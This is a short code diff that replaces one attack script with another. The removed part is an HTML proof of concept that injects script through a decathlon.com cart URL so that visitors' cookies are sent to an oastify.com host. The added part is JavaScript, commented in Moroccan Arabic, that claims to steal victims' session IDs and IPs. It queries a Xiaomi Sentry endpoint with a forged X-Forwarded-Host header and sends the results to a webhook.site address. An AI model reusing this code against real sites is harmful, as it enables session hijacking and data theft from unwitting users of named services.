@@ -1,10 +1,19 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>PoC - Final Decathlon Exploit</title>
-</head>
-<body>
-    <script src="https://www.decathlon.com/cart/update.js?attributes[_source]=Rebuyqk3j7%22%3Bfetch(%22https%3A%2F%2Fiqcsepq2miyatrx701dau22t2k8bw8kx.oastify.com%3Fc%3D%22%2Bbtoa(document.cookie))%3B%2F%2F&attributes[_attribution]=Smart Cart 2.0"></script>
-   
-</body>
-</html>
+// هاد السكريبت كيحاول يسرق الـ Session ID والـ IP ديال أي ضحية
+fetch('https://alisgp-sentry.d.xiaomi.net/api/4/envelope/?sentry_key=3af74c2d5d8b493f93abc405cb83371a', {
+    method: 'POST',
+    mode: 'cors',
+    headers: {
+        'X-Forwarded-Host': 'alisgp-sentry.pt.xiaomi.com' // Bypass للـ Internal Node
+    },
+    body: JSON.stringify({
+        "sent_at": new Date().toISOString(),
+        "type": "session", // هنا كنطلبوا تفاصيل الجلسة الحالية
+        "init": true
+    })
+})
+.then(response => response.json())
+.then(data => {
+    // إرسال البيانات المسروقة لـ Webhook ديالك (المهاجم)
+    fetch('https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?stolen_data=' + btoa(JSON.stringify(data)));
+    console.log("Victim Session Exfiltrated!");
+});
